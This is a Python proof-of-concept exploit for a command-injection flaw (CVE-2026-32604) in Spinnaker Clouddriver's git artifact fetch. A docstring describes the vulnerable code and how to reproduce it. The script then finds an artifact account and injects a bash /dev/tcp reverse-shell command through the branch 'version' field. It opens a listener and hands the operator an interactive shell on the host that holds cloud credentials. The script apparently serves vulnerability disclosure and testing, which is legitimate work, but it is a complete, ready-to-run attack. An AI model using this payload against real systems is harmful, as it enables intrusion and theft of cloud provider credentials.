#!/usr/bin/env python3
"""
uv run --no-project --with requests clouddriver_rce_via_git_clone.py [OPTIONS]

Two modes of operation:

  Direct to Clouddriver (default, internal network access):
    uv run --no-project --with requests clouddriver_rce_via_git_clone.py \\
        --clouddriver-url http://localhost:7002

  Through Gate (internet-facing, requires auth):
    uv run --no-project --with requests clouddriver_rce_via_git_clone.py \\
        --gate-url http://localhost:8084 --gate-user USER --gate-password PASS

Finding: Git Clone Shell Injection (RCE) via ArtifactController
CVE: CVE-2026-32604
SEVERITY: Critical (10.0)
CWE: CWE-78 (OS Command Injection)

SUMMARY:
  Spinnaker allows any user to fetch artifacts by specifying a repository
  URL and branch name. The branch name is passed unsanitized into a shell
  command, giving an attacker arbitrary OS command execution on the
  Clouddriver host — the service that holds all cloud provider credentials
  (AWS keys, GCP service accounts, Kubernetes configs). No special roles
  or permissions are required: the artifact fetch endpoint is open to any
  authenticated user through Gate, and completely unauthenticated when
  Clouddriver is accessed directly on the internal network.

  The endpoint is reachable two ways:
    1. Directly on Clouddriver (port 7002) — no authentication required
    2. Through Gate (port 8084) at the same path — any authenticated user

VULNERABLE CODE:
  clouddriver/clouddriver-artifacts/clouddriver-artifacts-gitrepo/src/main/java/
  com/netflix/spinnaker/clouddriver/artifacts/gitRepo/GitJobExecutor.java:

  Line 150-151 (cloneBranchOrTag):
    String command =
        gitExecutable + " clone --branch " + branch + " --depth 1 " + repoUrlWithAuth(repoUrl);

  Line 302-318 (cmdToList):
    case USER_PASS:
    case USER_TOKEN:
    case TOKEN:
        cmdList.add("sh");
        cmdList.add("-c");
        cmdList.add(cmd);   // <-- entire command with tainted branch

IMPACT:
  Arbitrary OS command execution on the Clouddriver host with the privileges
  of the Clouddriver service user. This gives full control over the
  Clouddriver process, access to all cloud provider credentials, and
  potential lateral movement within the Spinnaker deployment.

REPRODUCTION:
  1. Identify a git/repo artifact account with HTTP-based auth
  2. PUT /artifacts/fetch with type=git/repo, the account name, a valid
     HTTP(S) reference URL, and version set to a shell injection payload
  3. The payload executes as a shell command on the Clouddriver host

REQUIREMENTS:
  - Clouddriver with artifacts.git-repo.enabled=true
  - A git-repo artifact account configured with username/password or token auth
  - Either: network access to Clouddriver (port 7002), OR
            authenticated access to Gate (port 8084)
"""

import argparse
import os
import select
import socket
import sys
import termios
import threading
import time
import tty

import requests


def interactive_shell(sock):
    """Bridge stdin/stdout to a socket for an interactive shell session."""
    old_tty = termios.tcgetattr(sys.stdin)
    try:
        tty.setraw(sys.stdin.fileno())
        while True:
            r, _, _ = select.select([sock, sys.stdin], [], [], 0.5)
            if sock in r:
                data = sock.recv(4096)
                if not data:
                    break
                sys.stdout.buffer.write(data.replace(b"\n", b"\r\n"))
                sys.stdout.flush()
            if sys.stdin in r:
                data = os.read(sys.stdin.fileno(), 1024)
                if not data:
                    break
                sock.send(data)
    finally:
        termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old_tty)


def main():
    parser = argparse.ArgumentParser(
        description="CVE-2026-32604: Git clone shell injection (RCE) via ArtifactController"
    )

    mode_group = parser.add_mutually_exclusive_group()
    mode_group.add_argument(
        "--clouddriver-url", default=None,
        help="Clouddriver base URL for direct mode (default: http://localhost:7002)",
    )
    mode_group.add_argument(
        "--gate-url", default=None,
        help="Gate base URL for authenticated mode (e.g. http://localhost:8084)",
    )

    parser.add_argument("--gate-user", default=None, help="Username for basic auth (LDAP/file)")
    parser.add_argument("--gate-password", default=None, help="Password for basic auth")
    parser.add_argument("--gate-token", default=None, help="Bearer token (OAuth2/OIDC)")
    parser.add_argument("--gate-cookie", default=None,
                        help="Session cookie value (e.g. 'SESSION=abc123' from browser)")
    parser.add_argument("--shell-port", type=int, default=9998,
                        help="Local port to listen on for reverse shell (default: 9998)")
    parser.add_argument("--shell-host", default="host.docker.internal",
                        help="Address the Clouddriver container uses to reach this machine "
                             "(default: host.docker.internal for Docker Desktop)")
    parser.add_argument(
        "--artifact-account", default=None,
        help="git/repo artifact account name (auto-discovered if not set)",
    )

    args = parser.parse_args()

    # Determine mode
    if args.gate_url:
        mode = "gate"
        base_url = args.gate_url
        if not (args.gate_user or args.gate_token or args.gate_cookie):
            print("[-] Gate mode requires one of: --gate-user, --gate-token, or --gate-cookie")
            sys.exit(1)
    else:
        mode = "direct"
        base_url = args.clouddriver_url or "http://localhost:7002"

    # Build authenticated session
    session = requests.Session()
    auth_method = "none"
    if mode == "gate":
        if args.gate_user:
            session.auth = (args.gate_user, args.gate_password or "")
            auth_method = f"basic ({args.gate_user})"
        if args.gate_token:
            session.headers["Authorization"] = f"Bearer {args.gate_token}"
            auth_method = "bearer token"
        if args.gate_cookie:
            session.headers["Cookie"] = args.gate_cookie
            auth_method = "session cookie"

    print("[*] CVE-2026-32604: Git Clone Shell Injection (RCE) via ArtifactController")
    if mode == "gate":
        print(f"[*] Mode: Through Gate (authenticated)")
        print(f"[*] Gate URL: {base_url}")
        print(f"[*] Auth: {auth_method}")
    else:
        print(f"[*] Mode: Direct to Clouddriver (no auth needed)")
        print(f"[*] Clouddriver URL: {base_url}")
    print()

    # --- Step 1: Find the git/repo artifact account ---
    print("[*] Step 1: Identifying git/repo artifact account...")
    try:
        resp = session.get(f"{base_url}/artifacts/credentials", timeout=10)
        if resp.status_code in (401, 403):
            print(f"[-] Authentication failed: HTTP {resp.status_code}")
            sys.exit(1)
        resp.raise_for_status()
    except requests.exceptions.ConnectionError as e:
        print(f"[-] Connection failed: {e}")
        sys.exit(1)
    except Exception as e:
        print(f"[-] Failed to reach service: {e}")
        sys.exit(1)

    creds = resp.json()
    print(f"[+] Found {len(creds)} artifact credential(s):")
    git_repo_account = args.artifact_account
    for c in creds:
        print(f"    - {c['name']} (types: {c['types']})")
        if not git_repo_account and "git/repo" in c.get("types", []):
            git_repo_account = c["name"]

    if not git_repo_account:
        print("[-] No git/repo artifact account found")
        print("    This exploit requires a git-repo account with HTTP-based auth")
        sys.exit(1)

    print(f"[*] Using git/repo account: {git_repo_account}")
    print()

    # --- Step 2: Start listener and send injection payload ---
    #
    # The vulnerable command is:
    #   sh -c "git clone --branch <BRANCH> --depth 1 <URL_WITH_AUTH>"
    #
    # We inject into <BRANCH>. The semicolon breaks out of the git command,
    # then we launch a bash reverse shell. The trailing semicolon and
    # comment absorb the rest of the original command.
    shell_cmd = f"bash -c 'bash -i >& /dev/tcp/{args.shell_host}/{args.shell_port} 0>&1'"
    injection = f"main; {shell_cmd} #"

    print(f"[*] Step 2: Launching reverse shell via artifact fetch...")
    print(f"    Injection: version = \"{injection}\"")
    print(f"    Reverse shell: {args.shell_host}:{args.shell_port}")
    print()

    print(f"[+] Starting listener on 0.0.0.0:{args.shell_port}")

    try:
        srv = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, 0)
        srv.bind(("::", args.shell_port))
    except OSError:
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(("0.0.0.0", args.shell_port))
    srv.listen(1)
    srv.settimeout(30)

    # Fire the injection in a background thread (it blocks until the shell exits)
    def fire_injection():
        artifact_payload = {
            "type": "git/repo",
            "artifactAccount": git_repo_account,
            "reference": "https://github.com/spinnaker/clouddriver.git",
            "version": injection,
        }
        try:
            session.put(f"{base_url}/artifacts/fetch", json=artifact_payload, timeout=300)
        except Exception:
            pass

    inject_thread = threading.Thread(target=fire_injection, daemon=True)
    inject_thread.start()
    print("[*] Injection payload sent, waiting for reverse shell...")

    try:
        conn, addr = srv.accept()
    except socket.timeout:
        print()
        print("[-] No reverse shell connection received after 30s.")
        print("    Possible reasons:")
        print(f"    - Clouddriver container cannot reach {args.shell_host}:{args.shell_port}")
        print("    - bash /dev/tcp not available in the container")
        print("    - git/repo account not using HTTP-based auth (sh -c path not taken)")
        srv.close()
        sys.exit(1)

    srv.close()

    print(f"[+] Connection from {addr[0]}:{addr[1]}")
    print()
    print("=" * 60)
    print("[+] REMOTE CODE EXECUTION CONFIRMED — Clouddriver service")
    print("=" * 60)
    print()
    print("  You now have a shell on the Clouddriver container.")
    print("  Try: id, env, whoami, cat /etc/os-release")
    print("  Type 'exit' or Ctrl+C to disconnect.")
    print()

    try:
        interactive_shell(conn)
    except KeyboardInterrupt:
        pass
    finally:
        conn.close()
        print()
        print("[*] Shell closed.")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print()
        sys.exit(130)
